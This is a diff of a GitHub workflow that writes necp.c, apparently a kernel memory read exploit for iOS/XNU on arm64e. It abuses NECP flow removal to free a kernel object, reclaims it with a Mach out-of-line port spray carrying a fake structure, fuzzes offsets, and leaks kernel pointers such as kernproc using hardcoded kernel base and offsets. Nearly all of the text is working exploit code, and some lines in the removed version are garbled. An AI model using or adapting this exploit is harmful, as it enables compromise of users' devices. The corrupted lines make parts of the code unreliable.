@@ -30,447 +30,432 @@ jobs:
           rm -f .github/workflows/natsuk1.yml
           rm -f .github/workflows/main.yml
 
-      - name: Rewrite necp.c with fuzz build
+      - name: Write necp.c
         run: |
           set -euo pipefail
-          cat > natsuk1/Exploit/necp.c <<'NECP_EOF'
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <stdint.h>
-          #include <stdbool.h>
-          #include <stdarg.h>
-          #include <unistd.h>
-          #include <errno.h>
-          #include <pthread.h>
-          #include <sys/syscall.h>
-          #include <mach/mach.h>
-          #include <mach/vm_map.h>
-          #include <mach/vm_region.h>
-          #include <mach/message.h>
+          python3 - <<'PYEOF'
+          lines = [
+          '#include <stdio.h>',
+          '#include <stdlib.h>',
+          '#include <string.h>',
+          '#include <stdint.h>',
+          '#include <stdbool.h>',
+          '#include <stdarg.h>',
+          '#include <unistd.h>',
+          '#include <errno.h>',
+          '#include <pthread.h>',
+          '#include <sys/syscall.h>',
+          '#include <mach/mach.h>',
+          '#include <mach/vm_map.h>',
+          '#include <mach/vm_region.h>',
+          '#include <mach/message.h>',
+          '',
+          '#include "nk_api.h"',
+          '',
+          '#ifndef SYS_NECP_OPEN',
+          '#define SYS_NECP_OPEN 501',
+          '#endif',
+          '#ifndef SYS_NECP_ACTION',
+          '#define SYS_NECP_ACTION 502',
+          '#endif',
+          '',
+          '#define KBASE 0xFFFFFFF007004000ULL',
+          '#define OFF_KERNPROC 0xBBB040ULL',
+          '#define OFF_TASK_LIST 0x10D53F0ULL',
+          '#define KPTR_MIN 0xFFFFFFF000000000ULL',
+          '#define KPTR_MAX 0xFFFFFFFFFF000000ULL',
+          '',
+          '#define NECP_ADD_CLIENT 0x01',
+          '#define NECP_COPY_RESULT 0x04',
+          '#define NECP_ADD_FLOW 0x11',
+          '#define NECP_REMOVE_FLOW 0x12',
+          '#define GATE_BYTE 9',
+          '',
+          '#define NCF_SZ 0x400',
+          '#define NCF_ASN 0x68',
+          '#define NCF_LEN 0x70',
+          '#define NCF_PAR 0x88',
+          '#define NCF_REF 0x58',
+          '',
+          '#define FUZZ_MAX 0x200',
+          '#define FUZZ_STEP 0x08',
+          '#define RESBUF 8192',
+          '#define NPORTS 256',
+          '#define PERPORT 5',
+          '',
+          'static uint64_t g_kbase;',
+          'static uint64_t g_slide;',
+          'static int g_res_off = -1;',
+          'static uint8_t g_res_buf[RESBUF];',
+          '',
+          'typedef struct {',
+          '    mach_msg_header_t hdr;',
+          '    mach_msg_body_t body;',
+          '    mach_msg_ool_descriptor_t ool;',
+          '} ool_t;',
+          '',
+          'static void lg(const char *tag, const char *sign, const char *fmt, ...) {',
+          '    char body[448];',
+          '    va_list ap;',
+          '    va_start(ap, fmt);',
+          '    vsnprintf(body, sizeof(body), fmt, ap);',
+          '    va_end(ap);',
+          '    char out[512];',
+          '    snprintf(out, sizeof(out), "%s%s", sign, body);',
+          '    nk_logx(tag, "%s", out);',
+          '}',
+          '#define LI(t, ...) lg(t, "", __VA_ARGS__)',
+          '#define LO(t, ...) lg(t, "+ ", __VA_ARGS__)',
+          '#define LE(t, ...) lg(t, "- ", __VA_ARGS__)',
+          '#define LW(t, ...) lg(t, "! ", __VA_ARGS__)',
+          '',
+          'static void dumpw(const char *tag, const uint8_t *p, int n) {',
+          '    char line[1024];',
+          '    int off = 0;',
+          '    if (n > 24) n = 24;',
+          '    for (int i = 0; i < n; i++) {',
+          '        uint64_t w;',
+          '        memcpy(&w, p + i * 8, 8);',
+          '        off += snprintf(line + off, sizeof(line) - off,',
+          '                        "%02d:%016llx ", i, (unsigned long long)w);',
+          '        if (off > 900) break;',
+          '    }',
+          '    LI(tag, "%s", line);',
+          '}',
+          '',
+          'static volatile int g_qw = 0;',
+          '',
+          'static mach_port_t port_new(void) {',
+          '    mach_port_t p = MACH_PORT_NULL;',
+          '    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)',
+          '        != KERN_SUCCESS) return MACH_PORT_NULL;',
+          '    mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);',
+          '    mach_port_limits_t lim;',
+          '    lim.mpl_qlimit = 4096;',
+          '    kern_return_t kr = mach_port_set_attributes(mach_task_self(), p,',
+          '                                                 MACH_PORT_LIMITS_INFO,',
+          '                                                 (mach_port_info_t)&lim,',
+          '                                                 MACH_PORT_LIMITS_INFO_COUNT);',
+          '    if (kr != KERN_SUCCESS && !g_qw) {',
+          '        g_qw = 1;',
+          '        LW("PORT", "set_qlimit kr=%d", kr);',
+          '    }',
+          '    return p;',
+          '}',
+          '',
+          'typedef struct {',
+          '    mach_port_t ports[NPORTS];',
+          '    int n;',
+          '} spray_t;',
+          '',
+          'static void spray_init(spray_t *sp, int want) {',
+          '    sp->n = 0;',
+          '    if (want > NPORTS) want = NPORTS;',
+          '    for (int i = 0; i < want; i++) {',
+          '        mach_port_t p = port_new();',
+          '        if (p == MACH_PORT_NULL) break;',
+          '        sp->ports[sp->n++] = p;',
+          '    }',
+          '}',
+          '',
+          'static int spray_send(spray_t *sp, const void *d, size_t sz) {',
+          '    ool_t m;',
+          '    int sent = 0;',
+          '    for (int i = 0; i < sp->n; i++) {',
+          '        for (int j = 0; j < PERPORT; j++) {',
+          '            memset(&m, 0, sizeof(m));',
+          '            m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)',
+          '                             | MACH_MSGH_BITS_COMPLEX;',
+          '            m.hdr.msgh_size = sizeof(m);',
+          '            m.hdr.msgh_remote_port = sp->ports[i];',
+          '            m.hdr.msgh_id = 0x5500 + sent;',
+          '            m.body.msgh_descriptor_count = 1;',
+          '            m.ool.address = (void*)d;',
+          '            m.ool.size = (mach_msg_size_t)sz;',
+          '            m.ool.copy = MACH_MSG_VIRTUAL_COPY;',
+          '            m.ool.deallocate = FALSE;',
+          '            m.ool.type = MACH_MSG_OOL_DESCRIPTOR;',
+          '            if (mach_msg(&m.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,',
+          '                         sizeof(m), 0, MACH_PORT_NULL, 50,',
+          '                         MACH_PORT_NULL) == MACH_MSG_SUCCESS) {',
+          '                sent++;',
+          '            } else break;',
+          '        }',
+          '    }',
+          '    return sent;',
+          '}',
+          '',
+          'static void spray_drain(spray_t *sp) {',
+          '    uint8_t buf[2048];',
+          '    mach_msg_header_t *h = (mach_msg_header_t*)buf;',
+          '    for (int i = 0; i < sp->n; i++) {',
+          '        for (int j = 0; j < PERPORT + 4; j++) {',
+          '            h->msgh_size = sizeof(buf);',
+          '            if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,',
+          '                         0, sizeof(buf), sp->ports[i], 1,',
+          '                         MACH_PORT_NULL) != KERN_SUCCESS) break;',
+          '        }',
+          '        mach_port_destroy(mach_task_self(), sp->ports[i]);',
+          '    }',
+          '    sp->n = 0;',
+          '}',
+          '',
+          'static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }',
+          '',
+          'static int nadd_client(int fd, uint8_t uuid[16]) {',
+          '    uint8_t p[1] = {0};',
+          '    return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,',
+          '                        uuid, (size_t)16, p, (size_t)1);',
+          '}',
+          '',
+          'static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {',
+          '    uint8_t req[56];',
+          '    memset(req, 0, sizeof(req));',
+          '    memcpy(req + 0x10, cu, 16);',
+          '    *(uint16_t*)(req + 0x20) = 0x0040;',
+          '    int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,',
+          '                         (void*)cu, (size_t)16, req, (size_t)56);',
+          '    if (r == 0) {',
+          '        memcpy(fu, req, 16);',
+          '        fu[GATE_BYTE] |= 0x01;',
+          '    }',
+          '    return r;',
+          '}',
+          '',
+          'static int nrm_flow(int fd, const uint8_t fu[16]) {',
+          '    return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,',
+          '                        (void*)fu, (size_t)16, NULL, (size_t)0);',
+          '}',
+          '',
+          'static int ncpy(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {',
+          '    return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,',
+          '                        (void*)cu, (size_t)16, b, (uint32_t)bl);',
+          '}',
+          '',
+          'static int trial(uint64_t tgt, uint32_t rd, int aoff, int loff, int poff,',
+          '                 uint8_t fill, uint8_t *out, int outsz) {',
+          '    uint8_t fake[NCF_SZ];',
+          '    memset(fake, fill, sizeof(fake));',
+          '    if (aoff >= 0 && aoff + 8 <= NCF_SZ) *(uint64_t*)(fake + aoff) = tgt;',
+          '    if (loff >= 0 && loff + 8 <= NCF_SZ) *(uint64_t*)(fake + loff) = rd;',
+          '    if (poff >= 0 && poff + 8 <= NCF_SZ) *(uint64_t*)(fake + poff) = 0;',
+          '    uint8_t junk[NCF_SZ];',
+          '    memset(junk, 0x41, sizeof(junk));',
+          '    spray_t ex;',
+          '    spray_init(&ex, NPORTS);',
+          '    spray_send(&ex, junk, NCF_SZ);',
+          '    int fd = nfd();',
+          '    if (fd < 0) { spray_drain(&ex); return -1; }',
+          '    uint8_t cu[16], fu[16];',
+          '    if (nadd_client(fd, cu) != 0 || nadd_flow(fd, cu, fu) != 0) {',
+          '        close(fd); spray_drain(&ex); return -2;',
+          '    }',
+          '    nrm_flow(fd, fu);',
+          '    spray_drain(&ex);',
+          '    usleep(200);',
+          '    spray_t sp;',
+          '    spray_init(&sp, NPORTS);',
+          '    spray_send(&sp, fake, NCF_SZ);',
+          '    usleep(150);',
+          '    memset(out, 0, outsz);',
+          '    int ret = ncpy(fd, cu, out, outsz);',
+          '    spray_drain(&sp);',
+          '    close(fd);',
+          '    return ret;',
+          '}',
+          '',
+          'static int fuzz(void) {',
+          '    const uint64_t tgt = 0xFFFFFFF00ADEE310ULL;',
+          '    uint8_t buf[RESBUF];',
+          '    uint8_t base[RESBUF];',
+          '    int br = trial(0, 0, -1, -1, NCF_PAR, 0x42, base, sizeof(base));',
+          '    LI("FUZZ", "baseline ret=%d", br);',
+          '    if (br > 0) {',
+          '        int nb = br / 8;',
+          '        dumpw("BASE", base, nb > 16 ? 16 : nb);',
+          '    }',
+          '    int hit = -1;',
+          '    for (int off = 0; off <= FUZZ_MAX; off += FUZZ_STEP) {',
+          '        int r = trial(tgt, 8, off, off + 8, NCF_PAR, 0x42,',
+          '                      buf, sizeof(buf));',
+          '        if (r <= 0) {',
+          '            LI("FUZZ", "off=0x%03x ret=%d", off, r);',
+          '            usleep(100);',
+          '            continue;',
+          '        }',
+          '        int cmplen = r < br ? r : br;',
+          '        int same = (r == br) && (memcmp(buf, base, cmplen) == 0);',
+          '        int has_k = 0;',
+          '        int k_off = -1;',
+          '        int has_t = 0;',
+          '        for (int i = 0; i + 8 <= r; i++) {',
+          '            uint64_t val;',
+          '            memcpy(&val, buf + i, 8);',
+          '            if (val >= KPTR_MIN && val <= KPTR_MAX) {',
+          '                has_k = 1;',
+          '                k_off = i;',
+          '            }',
+          '            if (val == tgt) has_t = 1;',
+          '        }',
+          '        LI("FUZZ", "off=0x%03x ret=%d same=%d kptr=%d@%d target=%d",',
+          '           off, r, same, has_k, k_off, has_t);',
+          '        if (has_t) {',
+          '            hit = off;',
+          '            LO("FUZZ", "HIT off=0x%x", off);',
+          '            int nb = r / 8;',
+          '            dumpw("HIT", buf, nb > 16 ? 16 : nb);',
+          '            break;',
+          '        }',
+          '        usleep(80);',
+          '    }',
+          '    return hit;',
+          '}',
+          '',
+          'static int calibrate(void) {',
+          '    if (g_res_off >= 0) return 0;',
+          '    int off = fuzz();',
+          '    if (off < 0) {',
+          '        LW("CAL", "fuzz no hit, fallback 0x%x", NCF_ASN);',
+          '        off = NCF_ASN;',
+          '    }',
+          '    const uint64_t expect = 0xFFFFFFF00ADEE310ULL;',
+          '    uint8_t b[RESBUF];',
+          '    for (int a = 0; a < 4; a++) {',
+          '        int r = trial(g_kbase + OFF_KERNPROC, 8, off, off + 8,',
+          '                      NCF_PAR, 0x42, b, sizeof(b));',
+          '        if (r > 0) {',
+          '            for (int i = 0; i + 8 <= r; i++) {',
+          '                uint64_t val;',
+          '                memcpy(&val, b + i, 8);',
+          '                if (val >= KPTR_MIN && val <= KPTR_MAX) {',
+          '                    g_res_off = i;',
+          '                    LO("CAL", "aoff=0x%x roff=0x%x val=0x%llx %s",',
+          '                       off, i, (unsigned long long)val,',
+          '                       val == expect ? "MATCH" : "kptr");',
+          '                    return 0;',
+          '                }',
+          '            }',
+          '        }',
+          '        usleep(300);',
+          '    }',
+          '    return -1;',
+          '}',
+          '',
+          'static uint64_t kr64(uint64_t addr) {',
+          '    if (g_res_off < 0 && addr != g_kbase + OFF_KERNPROC) {',
+          '        if (calibrate() != 0) return 0;',
+          '    }',
+          '    uint8_t b[RESBUF];',
+          '    int r = trial(addr, 8, NCF_ASN, NCF_LEN, NCF_PAR, 0x42,',
+          '                  b, sizeof(b));',
+          '    if (r <= 0) return 0;',
+          '    int off = g_res_off >= 0 ? g_res_off : 0;',
+          '    if (off + 8 > r) return 0;',
+          '    uint64_t val;',
+          '    memcpy(&val, b + off, 8);',
+          '    return val;',
+          '}',
+          '',
+          'static uint32_t kr32(uint64_t addr) {',
+          '    return (uint32_t)(kr64(addr) & 0xFFFFFFFF);',
+          '}',
+          '',
+          'static int sanity(void) {',
+          '    uint64_t kp = kr64(g_kbase + OFF_KERNPROC);',
+          '    uint64_t tl = kr64(g_kbase + OFF_TASK_LIST);',
+          '    LI("SAN", "kernproc=0x%llx task_list=0x%llx",',
+          '       (unsigned long long)kp, (unsigned long long)tl);',
+          '    int ok = 0;',
+          '    if (kp >= KPTR_MIN && kp <= KPTR_MAX) ok++;',
+          '    if (tl >= KPTR_MIN && tl <= KPTR_MAX) ok++;',
+          '    return ok == 2 ? 0 : -1;',
+          '}',
+          '',
+          'static int task_sanity(void) {',
+          '    uint64_t kp = kr64(g_kbase + OFF_KERNPROC);',
+          '    if (!kp || kp < KPTR_MIN || kp > KPTR_MAX) return -1;',
+          '    uint32_t pid = kr32(kp + 0x74);',
+          '    LI("TASK", "kernproc pid=%u", pid);',
+          '    return pid == 0 ? 0 : -1;',
+          '}',
+          '',
+          'static volatile int g_busy = 0;',
+          '',
+          'static int impl(void) {',
+          '    nk_log("");',
+          '    nk_log("=== natsuk1 v1.8 (natsuk1-kread-v8-fuzz) ===");',
+          '    nk_log("target: iOS 27.0 / XNU / arm64e");',
+          '    nk_log("");',
+          '    LI("INIT", "NCF_SZ=0x%x PORTS=%d PER=%d FUZZ=0..0x%x STEP=0x%x",',
+          '       NCF_SZ, NPORTS, PERPORT, FUZZ_MAX, FUZZ_STEP);',
+          '    g_slide = 0x3D00000ULL;',
+          '    g_kbase = KBASE + g_slide;',
+          '    LO("P1", "kbase=0x%llx", (unsigned long long)g_kbase);',
+          '    {',
+          '        int fd = nfd();',
+          '        if (fd < 0) {',
+          '            LE("P2", "necp_open errno=%d", errno);',
+          '            return 1;',
+          '        }',
+          '        close(fd);',
+          '        LO("P2", "necp OK");',
+          '    }',
+          '    LI("P3", "calibrate");',
+          '    if (calibrate() != 0) {',
+          '        LE("P3", "failed");',
+          '        return 1;',
+          '    }',
+          '    LO("P3", "kread ready roff=0x%x", g_res_off);',
+          '    if (sanity() != 0) {',
+          '        LE("P4", "sanity failed");',
+          '        return 1;',
+          '    }',
+          '    if (task_sanity() != 0) LW("P5", "task chain broken");',
+          '    LO("DONE", "kread complete");',
+          '    return 0;',
+          '}',
+          '',
+          'int nk_necp_run(void) {',
+          '    if (__sync_lock_test_and_set(&g_busy, 1)) {',
+          '        nk_log("[!] already running");',
+          '        return 1;',
+          '    }',
+          '    int rc = impl();',
+          '    __sync_lock_release(&g_busy);',
+          '    return rc;',
+          '}',
+          '',
+          'int nk_full_exploit(void) { return nk_necp_run(); }',
+          ]
+          with open("natsuk1/Exploit/necp.c", "w") as f:
+              for l in lines:
+                  f.write(l + "\n")
+          print("wrote %d lines" % len(lines))
+          PYEOF
 
-          #include "nk_api.h"
-
-          #ifndef SYS_NECP_OPEN
-          #define SYS_NECP_OPEN   501
-          #endif
-          #ifndef SYS_NECP_ACTION
-          #define SYS_NECP_ACTION 502
-          #endif
-
-          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL
-          #define OFF_KERNPROC            0xBBB040ULL
-          #define OFF_TASK_LIST           0x10D53F0ULL
-          #define KPTR_MIN                0xFFFFFFF000000000ULL
-          #define KPTR_MAX                0xFFFFFFFFFF000000ULL
-
-          #define NECP_ADD_CLIENT         0x01
-          #define NECP_COPY_RESULT        0x04
-          #define NECP_ADD_FLOW           0x11
-          #define NECP_REMOVE_FLOW        0x12
-          #define GATE_BYTE               9
-
-          #define NCF_STRUCT_SZ           0x400
-          #define NCF_ASSIGNED_OFF        0x68
-          #define NCF_ASSIGNED_LEN_OFF    0x70
-          #define NCF_PARENT_OFF          0x88
-          #define NCF_REFCNT_OFF          0x58
-
-          #define FUZZ_MAX_OFF            0x200
-          #define FUZZ_STEP               0x08
-          #define RESULT_BUF_SZ           8192
-          #define NKS1_MAX_PORTS          256
-          #define NKS1_PER_PORT           5
-
-          static uint64_t g_kbase   = 0;
-          static uint64_t g_slide   = 0;
-          static int      g_res_off = -1;
-          static uint8_t  g_res_buf[RESULT_BUF_SZ];
-
-          typedef struct {
-              mach_msg_header_t          hdr;
-              mach_msg_body_t            body;
-              mach_msg_ool_descriptor_t  ool;
-          } ool_send_t;
-
-          static void log_info(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "%s", body);
-          }
-          static void log_ok(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "+ %s", body);
-          }
-          static void log_err(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "- %s", body);
-          }
-          static void log_warn(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "! %s", body);
-          }
-
-          static void dump_buf_words(const char *tag, const uint8_t *p, int n, int maxw) {
-              char line[1024];
-              int off = 0;
-              for (int i = 0; i < n && i < maxw; i++) {
-                  uint64_t w; memcpy(&w, p + i*8, 8);
-                  off += snprintf(line + off, sizeof(line) - off,
-                                  "%02d:%016llx ", i, (unsigned long long)w);
-                  if (off > 900) break;
-              }
-              log_info(tag, "%s", line);
-          }
-
-          static volatile int g_qlimit_warned = 0;
-
-          static int port_set_qlimit(mach_port_t p, mach_port_msgcount_t limit) {
-              mach_port_limits_t limits;
-              limits.mpl_qlimit = limit;
-              kern_return_t kr = mach_port_set_attributes(mach_task_self(), p,
-                                                          MACH_PORT_LIMITS_INFO,
-                                                          (mach_port_info_t)&limits,
-                                                          MACH_PORT_LIMITS_INFO_COUNT);
-              if (kr != KERN_SUCCESS && !g_qlimit_warned) {
-                  g_qlimit_warned = 1;
-                  log_warn("PORT", "set_qlimit kr=%d (suppressed)", kr);
-              }
-              return kr;
-          }
-
-          static mach_port_t port_new(void) {
-              mach_port_t p = MACH_PORT_NULL;
-              kern_return_t kr = mach_port_allocate(mach_task_self(),
-                                                    MACH_PORT_RIGHT_RECEIVE, &p);
-              if (kr != KERN_SUCCESS) { return MACH_PORT_NULL; }
-              (void)mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
-              (void)port_set_qlimit(p, 4096);
-              return p;
-          }
-
-          typedef struct {
-              mach_port_t ports[NKS1_MAX_PORTS];
-              int count;
-          } nks1_spray_t;
-
-          static void nks1_spray_init(nks1_spray_t *sp, int want) {
-              sp->count = 0;
-              if (want > NKS1_MAX_PORTS) want = NKS1_MAX_PORTS;
-              for (int i = 0; i < want; i++) {
-                  mach_port_t p = port_new();
-                  if (p == MACH_PORT_NULL) break;
-                  sp->ports[sp->count++] = p;
-              }
-          }
-
-          static int nks1_spray_send(nks1_spray_t *sp, const void *data, size_t sz) {
-              ool_send_t m;
-              int sent = 0;
-              for (int i = 0; i < sp->count; i++) {
-                  for (int j = 0; j < NKS1_PER_PORT; j++) {
-                      memset(&m, 0, sizeof(m));
-                      m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
-                                             | MACH_MSGH_BITS_COMPLEX;
-                      m.hdr.msgh_size        = sizeof(m);
-                      m.hdr.msgh_remote_port = sp->ports[i];
-                      m.hdr.msgh_id          = 0x5500 + sent;
-                      m.body.msgh_descriptor_count = 1;
-                      m.ool.address    = (void*)data;
-                      m.ool.size       = (mach_msg_size_t)sz;
-                      m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
-                      m.ool.deallocate = FALSE;
-                      m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
-                      if (mach_msg(&m.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                                   sizeof(m), 0, MACH_PORT_NULL, 50,
-                                   MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
-                          sent++;
-                      } else {
-                          break;
-                      }
-                  }
-              }
-              return sent;
-          }
-
-          static void nks1_spray_drain(nks1_spray_t *sp) {
-              uint8_t buf[2048];
-              mach_msg_header_t *h = (mach_msg_header_t*)buf;
-              for (int i = 0; i < sp->count; i++) {
-                  for (int j = 0; j < NKS1_PER_PORT + 4; j++) {
-                      h->msgh_size = sizeof(buf);
-                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                   0, sizeof(buf), sp->ports[i], 1,
-                                   MACH_PORT_NULL) != KERN_SUCCESS) break;
-                  }
-                  mach_port_destroy(mach_task_self(), sp->ports[i]);
-              }
-              sp->count = 0;
-          }
-
-          static int necp_open_fd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
-
-          static int necp_add_client(int fd, uint8_t uuid[16]) {
-              uint8_t p[1] = {0};
-              return (int)syscall(SYS_NECP_ACTION, fd,
-                                  NECP_ADD_CLIENT, uuid, (size_t)16, p, (size_t)1);
-          }
-
-          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
-              uint8_t req[56];
-              memset(req, 0, sizeof(req));
-              memcpy(req + 0x10, cuuid, 16);
-              *(uint16_t*)(req + 0x20) = 0x0040;
-              int r = (int)syscall(SYS_NECP_ACTION, fd,
-                                   NECP_ADD_FLOW, (void*)cuuid, (size_t)16,
-                                   req, (size_t)56);
-              if (r == 0) {
-                  memcpy(fuuid, req, 16);
-                  fuuid[GATE_BYTE] |= 0x01;
-              }
-              return r;
-          }
-
-          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
-              return (int)syscall(SYS_NECP_ACTION, fd,
-                                  NECP_REMOVE_FLOW, (void*)fuuid, (size_t)16,
-                                  NULL, (size_t)0);
-          }
-
-          static int necp_copy_result(int fd, const uint8_t cuuid[16],
-                                       uint8_t *buf, size_t blen) {
-              return (int)syscall(SYS_NECP_ACTION, fd,
-                                  NECP_COPY_RESULT, (void*)cuuid, (size_t)16,
-                                  buf, (uint32_t)blen);
-          }
-
-          /* ---------- single trial: read target_kaddr with given offset ---------- */
-
-          static int kread_trial(uint64_t target_kaddr, uint32_t read_len,
-                                  int assigned_off, int len_off, int parent_off,
-                                  uint8_t fill, uint8_t *out_buf, int out_buf_sz) {
-              uint8_t fake[NCF_STRUCT_SZ];
-              memset(fake, fill, sizeof(fake));
-              if (assigned_off >= 0 && assigned_off + 8 <= NCF_STRUCT_SZ)
-                  *(uint64_t*)(fake + assigned_off) = target_kaddr;
-              if (len_off >= 0 && len_off + 8 <= NCF_STRUCT_SZ)
-                  *(uint64_t*)(fake + len_off) = read_len;
-              if (parent_off >= 0 && parent_off + 8 <= NCF_STRUCT_SZ)
-                  *(uint64_t*)(fake + parent_off) = 0;
-
-              uint8_t junk[NCF_STRUCT_SZ];
-              memset(junk, 0x41, sizeof(junk));
-
-              nks1_spray_t ex;
-              nks1_spray_init(&ex, NKS1_MAX_PORTS);
-              (void)nks1_spray_send(&ex, junk, NCF_STRUCT_SZ);
-
-              int fd = necp_open_fd();
-              if (fd < 0) { nks1_spray_drain(&ex); return -1; }
-
-              uint8_t cuuid[16], fuuid[16];
-              if (necp_add_client(fd, cuuid) != 0 ||
-                  necp_add_flow(fd, cuuid, fuuid) != 0) {
-                  close(fd); nks1_spray_drain(&ex); return -2;
-              }
-
-              necp_remove_flow(fd, fuuid);
-              nks1_spray_drain(&ex);
-              usleep(200);
-
-              nks1_spray_t sp;
-              nks1_spray_init(&sp, NKS1_MAX_PORTS);
-              (void)nks1_spray_send(&sp, fake, NCF_STRUCT_SZ);
-              usleep(150);
-
-              memset(out_buf, 0, out_buf_sz);
-              int ret = necp_copy_result(fd, cuuid, out_buf, out_buf_sz);
-
-              nks1_spray_drain(&sp);
-              close(fd);
-              return ret;
-          }
-
-          /* ---------- fu zz NCF_ASSIGNED_OFF ---------- */
-
-          static int fuzz_assigned_off(void) {
-              const uint64_t target = 0xFFFFFFF00ADEE310ULL; /* kernproc value */
-              uint8_t buf[RESULT_BUF_SZ];
-              uint8_t base[RESULT_BUF_SZ];
-
-              /* baseline: no assigned pointer at all */
-              int br = kread_trial(0, 0, -1, -1, NCF_PARENT_OFF, 0x42,
-                                    base, sizeof(base));
-              log_info("FUZZ", "baseline ret=%d", br);
-              if (br > 0) dump_buf_words("BASE", base, br/8, 16);
-
-              int found_off = -1;
-
-              for (int off = 0; off <= FUZZ_MAX_OFF; off += FUZZ_STEP) {
-                  int r = kread_trial(target, 8, off,
-                                       off + 8, NCF_PARENT_OFF,
-                                       0x42, buf, sizeof(buf));
-                  if (r <= 0) {
-                      log_info("FUZZ", "off=0x%03x ret=%d", off, r);
-                      usleep(150);
-                      continue;
-                  }
-
-                  int same = (r == br) && (memcmp(buf, base, r < br ? r : br) == 0);
-                  int has_kptr = 0;
-                  int kptr_off = -1;
-                  for (int i = 0; i <= r - 8; i++) {
-                      uint64_t v; memcpy(&v, buf + i, 8);
-                      if (v >= KPTR_MIN && v <= KPTR_MAX) {
-                          has_kptr = 1; kptr_off = i; break;
-                      }
-                  }
-                  int has_target = 0;
-                  for (int i = 0; i <= r - 8; i++) {
-                      uint64_t v; memcpy(&v, buf + i, 8);
-                      if (v == target) { has_target = 1; break; }
-                  }
-
-                  log_info("FUZZ",
-                           "off=0x%03x ret=%d same=%d kptr=%d@%d target=%d",
-                           off, r, same, has_kptr, kptr_off, has_target);
-
-                  if (has_target) {
-                      found_off = off;
-                      log_ok("FUZZ", "HIT offset=0x%x", off);
-                      dump_buf_words("HIT", buf, r/8, 16);
-                      break;
-                  }
-                  if (!same) {
-                      log_info("FUZZ", "different layout at off=0x%x", off);
-                      dump_buf_words("DIFF", buf, r/8, 16);
-                  }
-                  usleep(100);
-              }
-              return found_off;
-          }
-
-          /* ---------- classic calibrate using reported offset ---------- */
-
-          static int calibrate_kread(void) {
-              if (g_res_off >= 0) return 0;
-
-              int off = fuzz_assigned_off();
-              if (off < 0) {
-                  log_warn("CAL", "fuzz no hit, trying legacy 0x%x", NCF_ASSIGNED_OFF);
-                  off = NCF_ASSIGNED_OFF;
-              }
-
-              const uint64_t expect = 0xFFFFFFF00ADEE310ULL;
-              uint8_t buf[RESULT_BUF_SZ];
-              for (int a = 0; a < 4; a++) {
-                  int r = kread_trial(g_kbase + OFF_KERNPROC, 8,
-                                       off, off + 8, NCF_PARENT_OFF,
-                                       0x42, buf, sizeof(buf));
-                  if (r > 0) {
-                      for (int i = 0; i <= r - 8; i++) {
-                          uint64_t v; memcpy(&v, buf + val i, 8=);
-                          if (0v >= KPTxR_MIN && v <=% KPTRll_MAX) {
-                              g_res_off = i;
-                              log_ok("CAL", "off=0x%x readoff=0x%xx %s",
-                                     off, i, (unsigned long long)v,
-                                     (v == expect) ? "MATCH" : "kptr");
-                              return 0;
-                          }
-                      }
-                  }
-                  usleep(300);
-              }
-              return -1;
-          }
-
-          static uint64_t kread64(uint64_t addr) {
-              if (g_res_off < 0 && addr != (g_kbase + OFF_KERNPROC)) {
-                  if (calibrate_kread() != 0) return 0;
-              }
-              uint8_t buf[RESULT_BUF_SZ];
-              int r = kread_trial(addr, 8, NCF_ASSIGNED_OFF,
-                                   NCF_ASSIGNED_LEN_OFF, NCF_PARENT_OFF,
-                                   0x42, buf, sizeof(buf));
-              if (r <= 0) return 0;
-              int off = (g_res_off >= 0) ? g_res_off : 0;
-              if (off + 8 > r) return 0;
-              uint64_t v; memcpy(&v, buf + off, 8);
-              return v;
-          }
-
-          static uint32_t kread32(uint64_t addr) {
-              return (uint32_t)(kread64(addr) & 0xFFFFFFFF);
-          }
-
-          static int sanity_check(void) {
-              uint64_t kernproc  = kread64(g_kbase + OFF_KERNPROC);
-              uint64_t task_list = kread64(g_kbase + OFF_TASK_LIST);
-              log_info("SANITY", "kernproc=0x%llx task_list=0x%llx",
-                       (unsigned long long)kernproc, (unsigned long long)task_list);
-              int ok = 0;
-              if (kernproc  >= KPTR_MIN && kernproc  <= KPTR_MAX) ok++;
-              if (task_list >= KPTR_MIN && task_list <= KPTR_MAX) ok++;
-              return ok == 2 ? 0 : -1;
-          }
-
-          static int task_sanity(void) {
-              uint64_t kernproc = kread64(g_kbase + OFF_KERNPROC);
-              if (!kernproc || kernproc < KPTR_MIN || kernproc > KPTR_MAX) return -1;
-              uint32_t pid = kread32(kernproc + 0x74);
